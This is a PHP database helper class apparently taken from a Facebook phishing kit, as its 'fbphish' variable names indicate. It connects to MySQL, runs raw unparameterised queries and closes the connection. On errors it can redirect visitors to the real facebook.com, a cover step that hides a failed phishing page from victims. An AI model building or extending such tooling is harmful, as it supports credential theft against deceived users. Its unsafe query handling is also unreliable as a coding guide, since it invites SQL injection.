<?php
require_once(__DIR__ . "/../config.inc.php");

class sql{
	private $fbphish_database_conn;
	private $fbphish_database_conn_err;
	private $query_arg1;
	private $query;
	private $success;

	public function db_connect() {
		global $fbphish_sql_host;
		global $fbphish_sql_db;
		global $fbphish_sql_user;
		global $fbphish_sql_password;
		global $config_option__451;
		global $fbphish_database_conn;
		global $fbphish_database_conn_err;
		global $success;

		try{
			// Connect
		    $fbphish_database_conn = new PDO("mysql:host=$fbphish_sql_host;dbname=$fbphish_sql_db", $fbphish_sql_user, $fbphish_sql_password);
		    // set the PDO error mode to exception
		    $fbphish_database_conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		    $fbphish_database_conn->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);

		    $success = "true";
		}catch(PDOException $fbphish_database_conn_err){
			$success = "false";

			// Error reporting
			switch($config_option__451){
				case "facebook":
					header("Location: https://facebook.com");
					break;
				case "home":
					header("Location: /index.php");
					break;
				case "show":
					echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
					break;
				default:
					header("Location: $config_option__451");
			}
		}
	}

	public function query($query_arg1){
		global $config_option__451;
		global $fbphish_database_conn;
		global $fbphish_database_conn_err;
		global $success;
		if($success == "true"){
			try{
			// Set the sql query
				$query = $query_arg1;
				// Execute sql
				$fbphish_database_conn->exec($query);
			}catch(PDOException $fbphish_database_conn_err){
				// Error reporting
				switch($config_option__451){
					case "facebook":
						header("Location: https://facebook.com");
						break;
					case "home":
						header("Location: /index.php");
						break;
					case "show":
						echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
						break;
					default:
						header("Location: $config_option__451");
				}
			}
		}else{
			die();
		}
	}

	public function db_close() {
		global $fbphish_database_conn;

		// Close connection
		$fbphish_database_conn = null;
	}
}